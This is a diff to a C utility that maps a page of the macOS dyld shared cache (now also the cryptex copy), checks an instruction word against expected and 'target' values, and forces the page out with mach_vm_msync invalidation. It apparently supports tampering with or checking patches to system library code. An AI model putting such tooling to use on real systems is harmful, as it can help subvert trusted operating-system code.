@@ -20,14 +20,16 @@ extern kern_return_t bootstrap_look_up(mach_port_t,const char*,mach_port_t*);
 #include "display-capture.h"
 static int control(int argc,char **argv){
  setvbuf(stdout,NULL,_IONBF,0);printf("live-display uid=%u pid=%d\n",getuid(),getpid());
- if(argc==6&&!strcmp(argv[1],"invalidate-cache-page")){
+ if((argc==6||argc==7)&&!strcmp(argv[1],"invalidate-cache-page")){
   const char *prefix="/System/Library/Caches/com.apple.dyld/";
+  const char *cryptex="/System/Cryptexes/OS/System/Library/Caches/com.apple.dyld/";
   uint64_t expected=strtoull(argv[3],NULL,0),offset=strtoull(argv[4],NULL,0);uint32_t expected_word=(uint32_t)strtoul(argv[5],NULL,0);
-  if(strncmp(argv[2],prefix,strlen(prefix))||strstr(argv[2],"..")||expected<4||expected>512*1024*1024||offset>expected-4||(offset&3)){puts("invalid cache page request");return 2;}
+  if((strncmp(argv[2],prefix,strlen(prefix))&&strncmp(argv[2],cryptex,strlen(cryptex)))||strstr(argv[2],"..")||expected<4||expected>512*1024*1024||offset>expected-4||(offset&3)){puts("invalid cache page request");return 2;}
   int fd=open(argv[2],O_RDONLY);struct stat st;if(fd<0){perror("open cache");return 1;}
   if(fstat(fd,&st)||(uint64_t)st.st_size!=expected){close(fd);puts("cache size mismatch");return 1;}
-  size_t bytes=(size_t)getpagesize();uint64_t start=offset&~((uint64_t)bytes-1);void *page=mmap(NULL,bytes,PROT_READ|PROT_EXEC,MAP_SHARED,fd,(off_t)start);close(fd);if(page==MAP_FAILED){perror("map cache page");return 1;}
+  size_t bytes=(size_t)getpagesize();uint64_t start=offset&~((uint64_t)bytes-1);void *page=mmap(NULL,bytes,PROT_READ,MAP_SHARED,fd,(off_t)start);close(fd);if(page==MAP_FAILED){perror("map cache page");return 1;}
   uint32_t before=0;memcpy(&before,(char*)page+(offset-start),4);printf("cache page offset=%#llx word=%#x\n",(unsigned long long)start,before);
+  if(argc==7&&before==(uint32_t)strtoul(argv[6],NULL,0)){puts("cache page already contains target word; keep resident");munmap(page,bytes);return 0;}
   if(before!=expected_word){puts("cache instruction mismatch; no invalidation");munmap(page,bytes);return 1;}
   kern_return_t(*invalidate)(mach_port_t,mach_vm_address_t,mach_vm_size_t,vm_sync_t)=(kern_return_t(*)(mach_port_t,mach_vm_address_t,mach_vm_size_t,vm_sync_t))dlsym(RTLD_DEFAULT,"mach_vm_msync");
   if(!invalidate){munmap(page,bytes);return 1;}kern_return_t status=invalidate(mach_task_self(),(mach_vm_address_t)page,bytes,VM_SYNC_INVALIDATE);munmap(page,bytes);printf("cache page invalidate-only kr=%d; no post-discard reread\n",status);return status?1:0;
